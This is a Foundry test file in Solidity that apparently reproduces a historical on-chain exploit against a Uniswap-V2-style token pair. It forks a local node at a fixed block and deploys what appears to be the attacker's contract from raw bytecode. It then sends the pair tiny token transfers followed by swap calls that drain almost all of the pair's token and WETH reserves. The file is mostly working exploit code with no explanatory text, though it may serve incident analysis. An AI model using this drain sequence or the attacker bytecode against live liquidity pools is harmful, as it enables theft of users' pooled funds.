// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0xbe643ccdcae57181b9fef554d63029e0605b2e860172d442c37eaabffdb44575
// https://etherscan.io/address/0x53Fc4a4a638378B9B81393fBE0FA9a6DE2323eBD

interface I {
    function swap(uint256, uint256, address, bytes memory) external payable;
    function token0() external payable returns (address);
    function transfer(address, uint256) external payable;
    function deposit() external payable;
    function balanceOf(address) external payable returns (uint256);
    function token1() external payable returns (address);
}

contract X2df0 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xbe643ccdcae57181b9fef554d63029e0605b2e860172d442c37eaabffdb44575");
    }

    address constant x0917 = 0x09176F68003c06F190ECdF40890E3324a9589557;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x8ce2 = 0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function test1() public {
        // vm.startPrank(0x53Fc4a4a638378B9B81393fBE0FA9a6DE2323eBD, 0x53Fc4a4a638378B9B81393fBE0FA9a6DE2323eBD);

        vm.createSelectFork("http://localhost:18545", 17057419); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x28e2203b9b813bd002230eb82e0353806541187b0409c5f673515eb3ee59f048));

        // https://explorer.phalcon.xyz/tx/eth/0x28e2203b9b813bd002230eb82e0353806541187b0409c5f673515eb3ee59f048
        this.x28e2203b();
        // https://explorer.phalcon.xyz/tx/eth/0xbe643ccdcae57181b9fef554d63029e0605b2e860172d442c37eaabffdb44575
        call(xc02a, x8ce2);
    }

    function test2() public {
        // vm.startPrank(0x53Fc4a4a638378B9B81393fBE0FA9a6DE2323eBD, 0x53Fc4a4a638378B9B81393fBE0FA9a6DE2323eBD);

        vm.createSelectFork("http://localhost:18545", 17057390); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x28e2203b9b813bd002230eb82e0353806541187b0409c5f673515eb3ee59f048
        this.x28e2203b();
        vm.warp(1681623167);
        vm.roll(17057419);
        // https://explorer.phalcon.xyz/tx/eth/0xbe643ccdcae57181b9fef554d63029e0605b2e860172d442c37eaabffdb44575
        call(xc02a, x8ce2);
    }

    function call(address, address) public {
        I(xc02a).transfer(x8ce2, 10);
        // address v1 = x0917;
        address v1 = I(x8ce2).token0();
        console2.log("I(x8ce2).token0()\t->", v1);
        // address v2 = x0917;
        address v2 = I(x8ce2).token0();
        console2.log("I(x8ce2).token0()\t->", v2);
        // uint256 v3 = 144658160860028020653094;
        uint256 v3 = I(x0917).balanceOf(x8ce2);
        console2.log("I(x0917).balanceOf(x8ce2)\t->", "144658160860028020653094 (144658.1608 ether)");
        I(x8ce2).swap(143211579251427740446563, 0, r, "");
        // address v4 = x0917;
        address v4 = I(x8ce2).token0();
        console2.log("I(x8ce2).token0()\t->", v4);
        I(x0917).transfer(x8ce2, 10);
        // address v5 = xc02a;
        address v5 = I(x8ce2).token1();
        console2.log("I(x8ce2).token1()\t->", v5);
        // uint256 v6 = 134341204654804399124;
        uint256 v6 = I(xc02a).balanceOf(x8ce2);
        console2.log("I(xc02a).balanceOf(x8ce2)\t->", "134341204654804399124 (134.3412 ether)");
        I(x8ce2).swap(0, 132997792608256355132, r, "");
    }

    function x28e2203b() public {
        this._constructor_{value: 1000000000}();
    }

    function _constructor_() public payable {
        I(xc02a).deposit{value: 1000000000}();

        bytes memory rt =
            hex"6080604052600436106100385760003560e01c80630d1ed437146100445780631b8b921d14610059578063a7996fa51461007957600080fd5b3661003f57005b600080fd5b610057610052366004610a78565b61008c565b005b34801561006557600080fd5b50610057610074366004610b68565b610890565b610057610087366004610c04565b61093e565b3360009081526020819052604090205460ff166100c45760405162461bcd60e51b81526004016100bb90610d1a565b60405180910390fd5b60405163a9059cbb60e01b81526001600160a01b038083166004830152600a602483015282919084169063a9059cbb906044016020604051808303816000875af1158015610116573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061013a9190610d37565b50826001600160a01b0316816001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa158015610183573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101a79190610d60565b6001600160a01b03160361054b57806001600160a01b031663022c0d9f60006103e8846001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015610207573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061022b9190610d60565b6040516370a0823160e01b81526001600160a01b03878116600483015291909116906370a0823190602401602060405180830381865afa158015610273573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102979190610d7d565b6102a3906103de610dac565b6102ad9190610dc9565b604080516000815260208101918290526001600160e01b031960e086901b169091526102e0929190309060248101610e3b565b600060405180830381600087803b1580156102fa57600080fd5b505af115801561030e573d6000803e3d6000fd5b50505050806001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015610350573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103749190610d60565b60405163a9059cbb60e01b81526001600160a01b038481166004830152600a6024830152919091169063a9059cbb906044016020604051808303816000875af11580156103c5573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103e99190610d37565b50806001600160a01b031663022c0d9f6103e8836001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa15801561043a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061045e9190610d60565b6040516370a0823160e01b81526001600160a01b03868116600483015291909116906370a0823190602401602060405180830381865afa1580156104a6573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104ca9190610d7d565b6104d6906103de610dac565b6104e09190610dc9565b604080516000808252602082019092523090825b506040518563ffffffff1660e01b81526004016105149493929190610e3b565b600060405180830381600087803b15801561052e57600080fd5b505af1158015610542573d6000803e3d6000fd5b50505050505050565b806001600160a01b031663022c0d9f6103e8836001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa15801561059b573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105bf9190610d60565b6040516370a0823160e01b81526001600160a01b03868116600483015291909116906370a0823190602401602060405180830381865afa158015610607573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061062b9190610d7d565b610637906103de610dac565b6106419190610dc9565b6040805160008082526020820190925230906040518563ffffffff1660e01b81526004016106729493929190610e3b565b600060405180830381600087803b15801561068c57600080fd5b505af11580156106a0573d6000803e3d6000fd5b50505050806001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa1580156106e2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107069190610d60565b60405163a9059cbb60e01b81526001600160a01b038481166004830152600a6024830152919091169063a9059cbb906044016020604051808303816000875af1158015610757573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061077b9190610d37565b50806001600160a01b031663022c0d9f60006103e8846001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa1580156107ce573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107f29190610d60565b6040516370a0823160e01b81526001600160a01b03878116600483015291909116906370a0823190602401602060405180830381865afa15801561083a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061085e9190610d7d565b61086a906103de610dac565b6108749190610dc9565b6040805160008082526020820190925230916104f4565b505050565b3360009081526020819052604090205460ff166108bf5760405162461bcd60e51b81526004016100bb90610d1a565b6000826001600160a01b0316826040516108d99190610e72565b6000604051808303816000865af19150503d8060008114610916576040519150601f19603f3d011682016040523d82523d6000602084013e61091b565b606091505b5050809150508061088b5760405162461bcd60e51b81526004016100bb90610d1a565b3360009081526020819052604090205460ff1661096d5760405162461bcd60e51b81526004016100bb90610d1a565b6000805b858110156105425786868281811061098b5761098b610e8e565b90506020020160208101906109a09190610ea4565b6001600160a01b03168585838181106109bb576109bb610e8e565b905060200201358483815181106109d4576109d4610e8e565b60200260200101516040516109e99190610e72565b60006040518083038185875af1925050503d8060008114610a26576040519150601f19603f3d011682016040523d82523d6000602084013e610a2b565b606091505b50508092505081610a4e5760405162461bcd60e51b81526004016100bb90610d1a565b80610a5881610ec1565b915050610971565b6001600160a01b0381168114610a7557600080fd5b50565b60008060408385031215610a8b57600080fd5b8235610a9681610a60565b91506020830135610aa681610a60565b809150509250929050565b634e487b7160e01b600052604160045260246000fd5b604051601f8201601f1916810167ffffffffffffffff81118282101715610af057610af0610ab1565b604052919050565b600082601f830112610b0957600080fd5b813567ffffffffffffffff811115610b2357610b23610ab1565b610b36601f8201601f1916602001610ac7565b818152846020838601011115610b4b57600080fd5b816020850160208301376000918101602001919091529392505050565b60008060408385031215610b7b57600080fd5b8235610b8681610a60565b9150602083013567ffffffffffffffff811115610ba257600080fd5b610bae85828601610af8565b9150509250929050565b60008083601f840112610bca57600080fd5b50813567ffffffffffffffff811115610be257600080fd5b6020830191508360208260051b8501011115610bfd57600080fd5b9250929050565b600080600080600060608688031215610c1c57600080fd5b853567ffffffffffffffff80821115610c3457600080fd5b610c4089838a01610bb8565b9097509550602091508782013581811115610c5a57600080fd5b610c668a828b01610bb8565b909650945050604088013581811115610c7e57600080fd5b8801601f81018a13610c8f57600080fd5b803582811115610ca157610ca1610ab1565b8060051b610cb0858201610ac7565b918252828101850191858101908d841115610cca57600080fd5b86850192505b83831015610d0657823586811115610ce85760008081fd5b610cf68f8983890101610af8565b8352509186019190860190610cd0565b809750505050505050509295509295909350565b60208082526003908201526232b93960e91b604082015260600190565b600060208284031215610d4957600080fd5b81518015158114610d5957600080fd5b9392505050565b600060208284031215610d7257600080fd5b8151610d5981610a60565b600060208284031215610d8f57600080fd5b5051919050565b634e487b7160e01b600052601160045260246000fd5b8082028115828204841417610dc357610dc3610d96565b92915050565b600082610de657634e487b7160e01b600052601260045260246000fd5b500490565b60005b83811015610e06578181015183820152602001610dee565b50506000910152565b60008151808452610e27816020860160208601610deb565b601f01601f19169290920160200192915050565b84815283602082015260018060a01b0383166040820152608060608201526000610e686080830184610e0f565b9695505050505050565b60008251610e84818460208701610deb565b9190910192915050565b634e487b7160e01b600052603260045260246000fd5b600060208284031215610eb657600080fd5b8135610d5981610a60565b600060018201610ed357610ed3610d96565b506001019056fea2646970667358221220a82008e7b75db9d68c5b1c366cdd09f33c4b42cb0c9c93b080e3370b40fc79bc64736f6c63430008120033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}
